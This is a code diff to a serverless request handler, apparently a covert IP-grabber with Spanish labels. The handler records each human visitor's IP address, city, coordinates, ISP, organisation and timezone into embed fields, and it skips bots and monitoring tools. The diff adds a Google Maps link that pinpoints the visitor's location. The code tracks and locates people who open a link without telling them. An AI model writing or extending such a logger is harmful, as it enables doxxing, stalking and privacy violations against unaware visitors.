@@ -15,7 +15,6 @@ module.exports = async function handler(req, res) {
   const acceptEncoding = req.headers["accept-encoding"] || "Unknown";
   const accept = req.headers["accept"] || "Unknown";
   const isSecure = req.headers["x-forwarded-proto"] === "https" || req.headers["x-vercel-proxy-request"] === "1";
-  const endpoint = req.url || "/private";
 
   const ignoreAgents = ["vercel", "vercel-favicon", "node", "axios", "curl", "wget", "uptime", "statuscake"];
   if (new RegExp(ignoreAgents.join("|"), "i").test(ua)) {
@@ -54,6 +53,7 @@ module.exports = async function handler(req, res) {
       { name: "📍 Ubicación", value: `${geo.city || "Desconocida"}, ${geo.regionName || ""}, ${geo.country || "Desconocido"}`, inline: false },
       { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: false },
       { name: "🗺️ Coordenadas", value: `${geo.lat || "?"}, ${geo.lon || "?"}`, inline: false },
+      { name: "🗺️ Ver en Mapa", value: `[Abrir en Google Maps](https://www.google.com/maps?q=${geo.lat || "0"},${geo.lon || "0"})`, inline: false },
       { name: "🏢 Proveedor", value: geo.isp || "Desconocido", inline: false },
       { name: "🏛️ Organización", value: geo.org || "Desconocida", inline: false },
       { name: "🕒 Zona Horaria", value: geo.timezone || "Desconocida", inline: false },
